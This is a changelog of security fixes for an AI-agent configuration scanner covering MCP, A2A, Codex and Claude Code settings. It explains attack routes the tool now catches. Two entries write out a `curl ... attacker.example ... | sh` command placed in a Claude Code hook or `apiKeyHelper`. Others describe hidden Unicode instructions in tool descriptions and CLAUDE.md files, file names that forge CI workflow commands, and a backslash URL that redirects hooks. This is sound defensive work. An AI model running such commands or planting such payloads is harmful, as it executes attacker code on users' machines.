# Changelog

Notable changes to Nexus SymBiote, newest release first. Within a release, security changes come first, and changes that need action from users are marked **Breaking**.

## [0.1.0] - Unreleased

First alpha of the AgentBOM toolkit under the Hunzee-VC organization. Not yet tagged or published; the date is set when the release is tagged.

### Security

- **Breaking:** tool descriptor hashes that match only the supplied BOM now leave integrity unknown. Validation reports internal consistency separately and requires matching local configuration evidence; neither matching nor a digest authenticates its source. A redacted descriptor is not counted as internally consistent, because only its displayed view can be recomputed.
- Add `verify-export` to check that a received CycloneDX or SPDX export equals the projection of its embedded native inventory. It does not authenticate producers or claims. A CycloneDX dependency row with only a `ref` declares a component dependency-free, so it fails verification when the inventory records a `depends-on` edge for that component, including a conditional edge withheld from the standard graph. Exports beyond fixed size limits are refused, and a document that conflicts with its inventory is rejected before schema validation, the costly step. CycloneDX uniqueness checks take linear time, so the order of members in a received object cannot stretch verification to minutes. The embedded inventory is parsed as strictly as the export, rejecting duplicate keys, and within the same nesting and value limits, which are checked before the slower RFC 8785 check; nesting too deep to parse is reported as a limit. Failures print one of three fixed messages, without a traceback or input text. `CycloneDXGenerator.recover` and `SPDXGenerator.recover` apply the same checks and limits, and raise `VerificationLimitError` instead of `RecursionError` for a deeply nested embedded inventory.
- **Breaking:** Bind static A2A cards and client declarations with an operator-keyed, RFC 8785 HMAC. Without `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`, A2A values remain partial coverage and default gates fail. Drift and project reconciliation reject missing, incompatible or changed bindings, including same-origin endpoint paths, authentication schemes and scopes. Recollect legacy snapshots with the same operator key before reviewing them. Every entry under both `clients` and `remoteAgents` is collected and bound: `remoteAgents` was ignored whenever `clients` existed, so its entries passed drift and reconciliation unseen. Other top-level client configuration fields are recorded as unknown coverage.
- **Breaking:** Require random key material for `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` in MCP and A2A collection, and stretch it before use. Any 32-character string was accepted, and the key identifier in every BOM, like a binding over a public card, let anyone holding it test passphrase guesses offline at one HMAC each and then test guesses for secrets inside bound declarations. The key must now be at least 64 hexadecimal characters; base64url and other encodings are rejected, and so are decoded bytes that are UTF-8 text, have fewer than 20 distinct values, repeat an 8-byte block or contain 8 bytes that change by a constant step. These checks cannot recognize every guessable key, such as the hash of a passphrase, so bindings and the key identifier now use a key derived by PBKDF2-HMAC-SHA256 with 600,000 iterations, once per process. Each offline guess costs that derivation; this slows guessing but does not make a guessable key safe. Generate a key with `python -c 'import secrets; print(secrets.token_hex(32))'` and recollect every keyed MCP and A2A snapshot made by an earlier build, because its bindings and key identifier differ. An invalid key and an A2A or MCP declaration that RFC 8785 cannot canonicalize now produce distinct failures that contain no values, instead of "invalid field types" or "invalid tool definition", and a card nested too deeply to canonicalize fails alone instead of aborting the whole A2A collector. The MCP collector reports an invalid key once and keeps its servers and tools unbound in the inventory; it dropped every server and recorded each as an invalid tool definition.
- Export only recognized authentication scheme identifiers for A2A clients, such as `bearer`, `apiKey` or `oauth2`. Any other `authMethods` or `authentication` value, such as a bearer token or an API key, was exported verbatim in native, CycloneDX and SPDX output; it is now exported as `[unrecognized]` and recorded as unknown coverage. A missing, anonymous or unrecognized client method raises an authentication finding.
- Check every URL that an A2A client entry declares in `agentCardUrl`, `url` or `endpoint`, and count a `null` client field as absent. Only the first of these fields present was read, so a `null` `agentCardUrl` hid a plaintext `url` behind it, and an `https://` `agentCardUrl` hid a plaintext `url` beside it. Neither raised a transport finding, so the inventory showed no plaintext endpoint. A client URL containing whitespace or control characters now fails collection of that entry, as an interface URL does; URL parsing dropped those characters and recorded another host.
- Reject unknown fields on native dependency edges instead of silently discarding them; regenerate the native schema and enforce this in built-wheel acceptance.
- Treat an empty A2A security alternative, and a legacy scheme such as `none`, `public`, `anonymous` or the empty string, as anonymous access. Card-level A2A 0.3 `security` is recorded in `security_requirements` beside v1 requirements, and skill-level requirements of both versions in `skill_security_requirements`. All are bound, and a change to their names or scopes raises a high-severity drift alert; card-level 0.3 `security` was not exported. Skill-level requirements add requirements for a skill and never relax the card-level requirement, which applies to every request. Record unsupported authentication semantics, on the card or a skill, as unknown coverage, including an A2A 0.3 or v1 requirement that names an undeclared, anonymous or unsupported scheme. v1 requirements were not checked against `securitySchemes`, so a v1 card that required an anonymous `none` scheme passed the default gate as requiring authentication, while the same 0.3 declaration failed it. A `null` optional or authentication field, such as `security`, `securitySchemes` or `authentication`, counts as absent, while a `null` card `name`, `skills`, `protocols` or `supportedInterfaces` fails collection of the card. An unrecognized `security` or `authentication` shape leaves the card in the inventory as unknown coverage instead of failing its collection.
- Record the A2A 0.3 `url` and `additionalInterfaces` in `legacy_interfaces`, also when a card declares v1 `supportedInterfaces`. The legacy URL of such a card was dropped and `additionalInterfaces` were never read, so repointing them to plain HTTP raised no transport finding and no drift. They are part of the HTTPS check and of the high-severity drift alert. Both spellings that a2a-python 0.3 accepts and routes on are read, `additionalInterfaces` or `additional_interfaces` and `preferredTransport` or `preferred_transport`; the snake_case spelling bypassed the check, and a card that uses both spellings of one field fails collection. Accept the gRPC `host:port` interface address that A2A v1 specifies instead of failing the whole card. It does not say whether the channel uses TLS, so it is exported as `grpc://host:port` with `"tls": "undeclared"` and raises a medium transport finding. Otherwise only an `https://` URL, or a `grpcs://` URL on a gRPC binding, counts as TLS: an explicit `grpc://` URL, and a gRPC URL on an HTTP binding, raise a high transport finding. Reject interface URLs that contain whitespace or control characters.
- `diff` reviews a supplied A2A component whose `collection_mode` is not a string instead of crashing with a `TypeError`.
- Read A2A v1 interface preferences and security requirements.
- Collect project-local Codex TOML declarations from every `.codex/config.toml` in the project, up to 16 layers, because Codex loads one from each directory between the project root and its working directory. The limit counts every layer in the tree, not only those on one directory chain, so a monorepo with more than 16 Codex layers, which passed before nested layers were collected, now fails both collectors; whether to replace the count with a byte budget across layers is a maintainer decision. Each directory is evaluated with the layers above it, merged table by table as Codex merges them, so a package layer may override one field of a root MCP server or approval policy; only a merged value Codex would refuse is a collection failure. Each layer's sandbox mode, approval policy and reviewer, `default_permissions`, `[permissions]` profiles, `[sandbox_workspace_write]` settings and MCP servers are recorded, and, as in Codex, a layer's `default_permissions` takes precedence over its `sandbox_mode`. Full access by any route, writable paths outside the project and sandbox network access are findings, and so are workspace writes with every approval prompt disabled, including Codex's default `:workspace` writes for a trusted project when no layer selects a sandbox. A profile that extends `:danger-full-access`, which Codex refuses, is a collection failure. The drift gate fails when a recorded declaration changes. A writable or workspace root through `node_modules`, `.git`, `__pycache__`, `venv` or `.venv` leaves coverage incomplete: the collection never enters those directories, so it cannot see a symlink there, and Codex writes to a symlinked root's target. Codex MCP servers also bind, without the operator key, their tool approval modes, tool allow and deny lists, OAuth scopes, stdio working directory, the names of forwarded environment variables (`env_vars`, `env_http_headers` and `bearer_token_env_var`) and the argument count of an `http_headers_helper` command, naming its program only when that is a known launcher. These names are redacted only against secret values of at least 8 characters, so a flag such as `DEBUG = "1"` no longer rewrites them, and distinct names that redaction would merge, which would hide a change to one of them, are a collection failure. Values the collectors cannot validate are collection failures, and settings they do not interpret, such as profile network proxy rules, `hooks`, `auto_review`, `[apps]` and the `.codex/hooks.json` that Codex reads from every project `.codex` folder, leave coverage incomplete. With the operator key their values are bound, so an edit to them fails the drift gate. Codex TOML larger than 256 KiB, nested more than 32 levels or with more than 16 unquoted dots on a line is a collection failure and is not parsed: tomllib's cost grows quadratically with the length of a dotted key, and a 32 KB key took about 7 seconds. Collection work is bounded too: each recorded name of a Codex MCP server is redacted against every secret value of that server, and a nested layer can merge an ancestor's server in a few bytes, so more than about 4 million such checks across a collection is a collection failure (each check is weighted by the length of the string it scans), as is permission-profile resolution that copies or checks more than 2 million grant entries. Without these bounds, one 256 KiB layer of profiles extending each other took over 7 minutes, and one server forwarding many environment names beside many environment values took about 20 seconds.
- **Breaking:** Check each artifact named in an operator signer policy. An unrelated file with a valid hash can no longer satisfy an unmatched policy entry, and `scan --signature-policy` now fails when a named artifact fails verification or matches no collected model. Previously `scan` exited 0 in both cases, with or without a project policy: a failed verification was recorded only on the model component, which `validate` and `risk` then rejected, and an entry that matched no collected model failed no gate at all. A project policy can no longer weaken an explicit signer policy: `scan` rejects one that deselects the model scanner, or that selects `failure_mode: report-only` unless `--report-only` is also passed, and `validate` rejects one that disables integrity validation; each exits with status 2. A project policy with `failure_mode: report-only` also let `scan --signature-policy` exit 0 when the named model was excluded. With `--signature-policy`, pass `--report-only` to inspect a failing scan or `--no-project-policy` to gate it, and remove a model-scanner deselection or `validate.require_integrity: false` from the project policy.
- **Breaking:** Reconcile repository dependency records during project validation and risk scoring. A supplied component that no collector produced can be linked to local subjects only as `verify-live --record` links a tool served by a local MCP server: through the tool's `mcp_server_ref`, that server's or an agent's `tool_refs`, and a `provides-tool` record from that server that claims no more assurance than the tool's own claims. Reconciliation fails on any other reference or dependency record between a local subject and such a component. It also fails on `verified` assurance in a supplied component, claim, dependency record or completeness claim, and on an `internal-verified` or `third-party-signed` trust tier on such a component, because no offline check establishes them. Previously a supplied BOM could list a guardrail with `verified` claims in the repository agent's `guardrail_refs`, and `validate --project` still passed it while `risk --project` reported it `project-reconciled`. The drift gate now alerts on added delegations, removed controls and changes to other recorded relationships. Regenerate supplied BOMs so that supplementary components link to local subjects only as `verify-live --record` links them, and carry no `verified` assurance.
- Keep text that UTF-8 cannot encode out of every export. A JSON escape or YAML value can hold a lone surrogate, and without the operator key nothing rejected one in an A2A card or client name, version, skill or interface field. The native BOM was written but could not be loaded, CycloneDX and SPDX export and SARIF for such a component crashed with a traceback, and `validate --project` and `risk --project` crashed even for a clean supplied BOM. `scan` now records `<collector>: component text cannot be encoded for export` and leaves the component out, and project reconciliation reports it as incomplete. A file or directory name that is not valid UTF-8 reached exports the same way through paths; the collection now records `<directory>: file name is not valid UTF-8` and skips it.
- Bound redaction work for JSON MCP configurations as for Codex layers. Every recorded string of a server, including each tool descriptor string and key, is redacted against every environment value of that server, with no bound: one `.mcp.json` server with 20,000 environment values and 200 tools took 21 seconds, and a 4 MiB file did not finish within 10 minutes. Each check scans the whole string, so the bound weighs each string by its length plus a fixed cost of 100 characters: more than 400 million such character checks across a collection, about a second of work and the equivalent of 4 million short-string checks, is now a collection failure, and the server past the bound is not recorded. One tool with a 2.6 MiB description beside 70,000 environment values, which took 230 seconds without a failure under a count of strings alone, now fails at once.
- Apply the Codex TOML limits to `pyproject.toml` in the registry collector. It parsed the file with no size or structure check, so one long dotted key within the 4 MiB read limit could keep the default scan busy for hours: a 64 KB key took 22 seconds. An integer longer than Python's 4,300-digit limit raised an error that aborted the whole registry collector and dropped its `requirements.txt`, `package.json` and Dockerfile records; it is now recorded as invalid TOML. The limit is conservative: a line with more than 16 unquoted dots, such as a one-line array of 17 floats, is recorded as a collection failure and not parsed.
- Reject ShadowScan summaries whose error totals or incomplete-reason counts contradict their connector records.
- Bind every confined read, stream and hash, model inspection, and signed-artifact hashing to both the open descriptor and the pathname. The descriptor's device, inode, link count, size and timestamps must not change, and when the read ends the pathname must still resolve to that device and inode. Size and timestamps alone missed a rename-over within one coarse timestamp tick. The link count alone misses one on overlayfs when the file sits in a lower layer, because the replaced inode is never unlinked: on such a mount a model swapped mid-scan was reported `safe` with a weight hash. Both cases, and an A→B→A swap during the read, now fail closed with safety `unknown`, hashes withheld and a recorded failure.
- Refuse IPv4-compatible (`::/96`) and SIIT-translated (`::ffff:0:0:0/96`) IPv6 destinations in live HTTPS discovery and advisory lookups. The public-address check rated them public even when they embedded loopback, link-local metadata or private IPv4 addresses, such as `::7f00:1` or `::a9fe:a9fe`.
- Neutralize line breaks, including U+2028 and U+2029, in inventory-derived text printed by the CLI. The earlier fix for terminal controls left the newline out, so a file or component name containing one could forge whole output lines, such as a passing status, and in a CI step print lines that GitHub Actions runs as workflow commands (`::error`, `::add-mask::`). `validate` printed such a file name from a scanned repository on 23 lines. The runner also reads the legacy `##[command]` syntax anywhere in a line, and `risk --project` printed reconciliation reasons at the start of a line, so a name needed no line break at all. Both are now neutralized, including in JSON written to standard output; error messages that quote policy keys or BOM references are reduced to one line; and the Action echoes collector output between `::stop-commands::` markers.
- Inventory PyTorch Lightning `.ckpt`, PaddlePaddle `.pdparams`, Keras `.h5`, `.hdf5` and `.keras`, and TensorFlow `saved_model.pb` model files. They were not discovered at all, so a malicious checkpoint produced no component and no finding while the model collector reported complete coverage. Pickle-based formats, now including `.dill`, compressed pickle and joblib dumps and dotfiles with those names, are rated code-executing. A `.keras` archive is also rated code-executing when its configuration, parsed as Keras parses it, carries a Lambda layer or a function outside the Keras packages, or when the archive holds a pickle member, duplicate member names or more than an ordinary archive's inspection limits. Keras HDF5 files, other `.keras` archives and `saved_model.pb` are reported unknown; for an HDF5 full model the evidence notes that Keras 3.0.0-3.11.2 run its Lambda layers while loading (CVE-2025-9905), and `validate` fails on every unknown format. These formats use the root-relative path as their component reference, so versioned layouts such as `<model>/<version>/saved_model.pb` do not collide. Found in an unmerged remediation branch from 2026-11-01 and reproduced on `main`.
- Apply MCP pinning checks to launchers named by a path or with a Windows suffix. `/usr/local/bin/npx`, `npx.cmd`, `uvx.exe` and `C:\tools\npx.ps1` lost their package reference, so an `@latest` or unpinned package raised no high `version_pinning` finding: a single such server scored 4 instead of 11. Launchers are now recognized by file name in any letter case, ignoring a `.exe`, `.cmd`, `.bat` or `.ps1` suffix. A path-qualified launcher gets no registry package identity, because the path can name any executable, and the server records `launcher_path_qualified`. Recollect inventories that contain such servers. Found in an unmerged remediation branch from 2026-11-01 and reproduced on `main`.
- Keep MCP pinning checks when a known launcher option precedes the package. GitHub's documented `docker run -i --rm -e GITHUB_PERSONAL_ACCESS_TOKEN ghcr.io/github/github-mcp-server`, `npx -y --package=pkg@latest pkg`, `npx --quiet pkg@latest` and `npx -y -- pkg@latest` lost their package reference, so an unpinned image or package raised no `version_pinning` finding. Value-taking `docker run` options such as `-e`, `-v`, `--name` and `--pull` are now skipped without recording their values, and `npx` and `bunx` read the package from `-p` or `--package`. A package launcher whose package still cannot be determined, for example after another option, gets a high `version_pinning` finding instead of none.
- Stop a tool's own `readOnlyHint` annotation from lowering its inferred side-effect profile. A tool named `delete_all_files` that declared `readOnlyHint: true` was rated read-only, so its high `capability_scope` finding disappeared and the risk score fell from 11 to 4. Self-declared hints can now only raise the profile: `destructiveHint` still marks a tool destructive, and a tool whose name matches no pattern stays unknown. Recollect inventories that contain such tools. Found in an unmerged remediation branch from 2026-11-01 and reproduced on `main`.
- Report hidden Unicode in configured MCP tool definitions. Bidirectional controls, tag characters and zero-width characters in a tool's name, description, input schema or annotations were never flagged, although the same characters in instruction files are: a description carrying tag-encoded instructions and a right-to-left override passed the risk gate with the score of a clean one. Bidirectional controls and tag characters are now critical `bidi_override` and `tag_characters` findings, which fail the default gate, and other invisible, format or control characters are high `invisible_characters` findings. Findings name the affected fields, never the text. A zero-width joiner inside an emoji sequence is not reported, and neither is a single variation selector after a character that has variants of that kind, such as an emoji, a keycap digit or a CJK ideograph. Any other selector renders as nothing and can encode one byte, so a payload placed after Braille blanks (U+2800) or curly quotation marks is invisible; such selectors are reported. An ideographic variation selector after each CJK ideograph can still carry almost one unreported byte. Recollect inventories that contain such tools. Found in an unmerged remediation branch from 2026-11-01 and reproduced on `main`.
- Raise dependency minimums past known advisories: cryptography 50, sigstore 4.4 with tuf 7, and pytest 9.0.3 for development. Sigstore 3.x is no longer supported.
- Lock dependency versions without known advisories (cryptography 50.0.2, sigstore 4.5.1, tuf 7.0.1, pytest 9.2.0) so the required OSV audit of the locked environment passes.
- Keep unused jsonschema format checkers out of the runtime validation worker. With the cyclonedx or all extras installed, their import cost exceeded the worker's CPU limit and every runtime authorization failed closed.
- Classify hidden characters in instruction files such as `CLAUDE.md` with the rules used for MCP tool definitions. The instruction-file check used a fixed list of five characters, so a payload encoded as variation selectors after Braille blanks (U+2800) and other format or control characters raised no finding, while a zero-width joiner inside an emoji sequence was a high finding. Both are now classified as in tool definitions; a byte order mark at the start of the file is still not reported. Found in review of an unmerged remediation branch.
- Keep jsonschema's `iri-reference` and `uri` format checkers out of core installs and the GitHub Action, and test that neither the core dependencies nor the Action lock adds them. rfc3987-syntax checks each IRI with an Earley parser that spends about half a millisecond of CPU and 16 KB of memory per character, so one long IRI in a received export could exhaust the host during `verify-export`. With rfc3986-validator installed, JSON Schema meta-validation asserted `uri-reference` on `$ref` and `$id`, so `discover-mcp` and `verify-live` refused MCP tool schemas that jsonschema resolves and runtime validation accepts, such as zod-to-json-schema output whose `$ref` names a property containing a space. Meta-validation of tool schemas in `discover-mcp`, `verify-live` and the runtime validation worker now checks only the `regex` format in every install, so such schemas are accepted and an invalid `pattern` is still refused. Because jsonschema installs its non-GPL format checkers together, core installs and the Action also skip the CycloneDX `date-time` format. The `cyclonedx` and `all` extras still install these checkers through cyclonedx-python-lib, as CI does: with them, run `verify-export` on untrusted exports only under CPU and memory limits.
- Require TLS 1.2 or later explicitly in the pinned HTTPS transport, and create `runtime keygen` public keys with mode 0600 like private keys.
- Bind static MCP server structure and reconcile configured tool fingerprints against fresh source evidence; with `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`, bind configuration values by HMAC so exports never carry a digest that secrets could be guessed from. Require recollection of legacy snapshots without the binding.
- Reject same-version MCP package substitutions, argument and endpoint-path drift, and edited supplied descriptors during project validation.
- Replace raw scanner exception text with safe diagnostic codes and record malformed model metadata using field names only.
- Read Claude's declared `permissions.defaultMode`, recognize bare broad tool grants, and retain allowances across collected settings layers without claiming effective authorization.
- Inventory Claude Code hooks declared in `.claude/settings.json` and `.claude/settings.local.json`. They were not collected at all, so a repository could add a hook that ran a command on every session start or tool call, such as `curl -s https://attacker.example/x | sh`, and still score `clean` with complete coverage. Each hook is now recorded on the IDE agent by settings file, event, matcher, `if` condition, handler type, executable name (`[unparsed]` after a leading environment assignment that contains a backslash, which a shell can read as escaping the space that ends the value), URL origin or MCP server and tool, `shell`, `async`, `asyncRewake`, `onFailure`, `timeout`, exec form, `allowedEnvVars` and header names, never by its command line, arguments, header values, MCP input or prompt. Each settings file's `disableAllHooks`, `httpHookAllowedEnvVars` and number of `allowedHttpHookUrls` patterns are recorded too, because `disableAllHooks: false` in a project overrides a user's `true` and the allowlists merge across settings files. Command and HTTP hooks are high findings (`agent-hook-command`, `agent-hook-http`) and MCP tool hooks medium (`agent-hook-mcp-tool`): Claude Code runs them without per-call approval, `-p` and SDK sessions never ask for workspace trust, and an HTTP response or MCP tool result can allow or rewrite a tool call. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` set, a keyed binding also covers hook arguments, header values, MCP input, prompts and allowlist patterns for drift and project reconciliation, ignoring the order of hooks that run in parallel. Hook declarations with an undocumented structure or handler type are recorded as collection failures, and so are name lists over a bound: 64 names per `allowedEnvVars`, header or `httpHookAllowedEnvVars` list and 2048 handler names in all, because 440,000 header names in each of two settings files produced a 20 MB BOM that `risk`, `diff` and `validate` refused to load. Found in an unmerged remediation branch from 2026-11-01 and reproduced on `main`. Re-collect and review baselines of repositories whose Claude Code settings declare hooks (including only prompt and agent hooks), the hook settings above or settings commands: `risk --project` reports their IDE agent as mismatched against older inventories.
- Flag shell commands that Claude Code settings run without approval: `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`, `otelHeadersHelper`, and the `command` of `statusLine`, `fileSuggestion` and `subagentStatusLine`. Claude Code uses them in `-p` and SDK sessions without workspace trust, but none was collected, so a `.claude/settings.json` with `apiKeyHelper: curl -s https://attacker.example/x | sh` passed the default gate as `clean` with complete coverage. Each is now a high `agent-settings-command` finding, recorded by settings file, setting and first word of the command; the keyed binding covers the command lines. The settings `env` block is still not collected. Found while reproducing the hooks review and reproduced on `main`.
- Keep IDE agent findings when a Claude Code hook declaration is malformed. A handler whose `type` was a list or object, or, with `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` set, a hook value with no canonical JSON form (a lone surrogate, `1e400` or an integer beyond 2^53), raised inside the collector and removed every IDE agent and its findings from the scan, including valid `curl ... | sh` hooks. Each is now a collection failure, and the remaining hooks are still recorded and flagged.
- Export Claude Code hook matchers and HTTP hook origins only in forms that every consumer and URL parser reads the same way. A lone surrogate in a matcher or URL host crashed CycloneDX and SPDX export and left a native BOM that `risk`, `validate`, `diff` and `summary` rejected. A URL such as `https://attacker.example\@hooks.corp.example/log` was reported as `https://hooks.corp.example` although Node, which sends Claude Code's HTTP hooks, posts it to `attacker.example`, so redirecting an approved hook raised no drift alert without the binding key. Matchers that are not printable ASCII of at most 512 characters, and HTTP URLs that are not plain `http://` or `https://` URLs with an ASCII host and no backslash or whitespace, are now recorded as `[unparsed]` and leave coverage unknown. At most 1000 hook declarations are inventoried, because 40,000 one-line handlers produced a 24 MB BOM that no command would load.
- Read Claude Code settings files whose names differ only in case, such as `.claude/Settings.json` or `.Claude/settings.json`. Claude Code opens the documented name, which the default macOS and Windows file systems resolve to these files, but the collector skipped them, so a hook in one scored `clean` with complete coverage. Up to 8 such files are read as settings layers; more leave coverage unknown.
- Read `.mcp.json`, `CLAUDE.md` and `.claude/CLAUDE.md` under names that differ only in case, such as `.MCP.json` or `claude.md`, as the settings files already were. Claude Code opens them by name, which the default macOS and Windows file systems resolve to those files, so a `.MCP.json` declaring a filesystem server rooted at `/` produced no MCP component and the default gate reported the repository `clean` with complete coverage. Up to 8 such files are read per name; more leave coverage unknown.
- Keep valid A2A cards and clients when one is nested too deeply for the keyed source binding. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` set, such a card raised out of the A2A collector, which then reported no A2A component at all; it is now a collection failure for that card or client only.
- Add independent runtime signing quorums for snapshots, trust status and action approvals; preserve them through pinned stdio invocation.
- Reject runtime CLI FIFO, symlink and oversized inputs through the bounded regular-file reader.
- Detect same-version MCP launcher package substitutions in project validation and drift checks. Review older baselines that lack the launcher identity.
- Reconcile locally collected security fields and findings before accepting supplied BOMs. Project-backed risk scoring rejects a conflicting inventory.
- Omit schema literals from MCP descriptor exports and corroborate the original static definition against project evidence.
- Reject contradictory native ShadowScan finding counts and conflicting public fields during CycloneDX and SPDX recovery. Emit only unconditional dependencies in the standard CycloneDX graph.
- Require successful canonical CI-workflow evidence for the exact publication source SHA, in addition to protected-branch settings.
